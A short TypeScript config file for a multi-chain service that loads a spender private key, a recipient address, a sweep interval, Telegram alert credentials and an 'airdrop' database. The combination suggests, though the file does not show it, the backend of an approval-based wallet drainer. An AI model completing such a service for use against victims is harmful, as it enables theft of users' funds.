import 'dotenv/config';
import { privateKeyToAccount } from 'viem/accounts';

function collectChains(): Record<number, string> {
  const out: Record<number, string> = {};
  for (const [k, v] of Object.entries(process.env)) {
    const m = /^RPC_(\d+)$/.exec(k);
    if (m && v) out[Number(m[1])] = v;
  }
  return out;
}

export const config = {
  port: Number(process.env.PORT || 8788),
  corsOrigin: process.env.CORS_ORIGIN || '*',
  apiKey: process.env.API_KEY || '',
  envSpender: (process.env.SPENDER_ADDRESS || '').trim(),
  spenderPrivateKey: (process.env.SPENDER_PRIVATE_KEY || '') as `0x${string}`,
  recipient: (process.env.RECIPIENT_ADDRESS || '').trim(),
  maxGasGwei: Number(process.env.MAX_GAS_GWEI || 50),
  sweepIntervalMs: Number(process.env.SWEEP_INTERVAL_MS || 60_000),
  telegramToken: process.env.TELEGRAM_BOT_TOKEN || '',
  telegramChatId: process.env.TELEGRAM_CHAT_ID || '',
  dbPath: process.env.DB_PATH || './data/airdrop.db',
  chains: collectChains(),
};

export const spenderAccount = config.spenderPrivateKey
  ? privateKeyToAccount(config.spenderPrivateKey)
  : null;

export const CHAIN_NAMES: Record<number, string> = {
  1: 'Ethereum', 56: 'BNB Chain', 137: 'Polygon',
  42161: 'Arbitrum', 10: 'Optimism', 8453: 'Base', 43114: 'Avalanche',
};